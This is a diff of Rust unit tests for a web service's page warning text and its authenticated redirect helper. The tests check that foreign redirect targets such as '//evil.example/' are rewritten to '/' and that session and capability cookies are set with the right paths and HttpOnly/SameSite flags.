+        let warn = page.find("returned to the agent word for word").expect("the warning is on the page");
+        let field = page.find("name=note").expect("the note field is on the page");
+        assert!(warn < field, "the warning comes before the field: {page}");
+        assert!(page.contains("as the reason if you press Can't do this"), "{page}");
     }
 
     #[test]
@@ -1049,16 +1212,21 @@ mod tests {
             assert!(same_origin_path(ok), "{ok:?}");
             assert_eq!(local(ok), ok);
         }
-        // On the wire: a foreign target becomes `/`, a same-origin one is kept, the cookie is set.
-        for (to, location) in [("//evil.example/", "/"), ("/t/abc?m=x", "/t/abc?m=x")] {
+        // On the wire: a foreign target becomes `/`, a same-origin one is kept, and the cookie
+        // is set where the route asked — the session at `/`, a card capability at its card.
+        for (to, location, name, cookie_path) in [
+            ("//evil.example/", "/", inbox_auth::COOKIE, "/"),
+            ("/t/abc?m=x", "/t/abc?m=x", inbox_auth::COOKIE, "/"),
+            ("/p/t_abc", "/p/t_abc", inbox_auth::CAP_COOKIE, "/p/t_abc"),
+        ] {
             let (mut c, s) = pair();
             c.write_all(b"GET /x HTTP/1.1\r\nHost: localhost\r\n\r\n").unwrap();
-            redirect_authed(read_request(s).unwrap(), to, "PLACEHOLDER").unwrap();
+            redirect_authed(read_request(s).unwrap(), to, name, cookie_path, "PLACEHOLDER").unwrap();
             let mut out = String::new();
             c.read_to_string(&mut out).unwrap();
             assert!(out.starts_with("HTTP/1.1 303 See Other\r\n"), "{out}");
             assert!(out.contains(&format!("\r\nLocation: {location}\r\n")), "{out}");
-            assert!(out.contains("\r\nSet-Cookie: tokenstash_inbox=PLACEHOLDER; Path=/; HttpOnly; SameSite=Strict\r\n"), "{out}");
+            assert!(out.contains(&format!("\r\nSet-Cookie: {name}=PLACEHOLDER; Path={cookie_path}; HttpOnly; SameSite=Strict\r\n")), "{out}");
             assert!(!out.contains("evil"), "{out}");
         }
     }
